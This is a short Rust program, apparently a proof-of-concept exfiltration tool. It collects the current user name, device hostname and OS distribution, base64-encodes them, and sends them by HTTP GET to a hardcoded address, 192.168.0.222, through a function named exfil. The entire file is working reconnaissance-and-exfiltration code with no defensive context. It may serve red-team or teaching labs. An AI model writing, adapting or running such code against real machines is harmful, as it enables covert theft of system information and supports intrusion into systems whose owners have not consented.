use whoami;
use minreq;
use base64;

fn exfil(url:&str,data:&str)
{
    let concatenated = [url, data].join("/");
    let response = minreq::get(concatenated).send();
    
}

fn main() {
    let userName =base64::encode(["UserName", &whoami::username()].join(":"));
    let deviceName =base64::encode(["DeviceHostname", &whoami::hostname()].join(":"));
    let hostDistro=base64::encode(["Distro",&whoami::distro()].join(":"));
    let exfilData = format!("{}{}{}",userName,deviceName,hostDistro);
    exfil("http://192.168.0.222/",&exfilData);
}

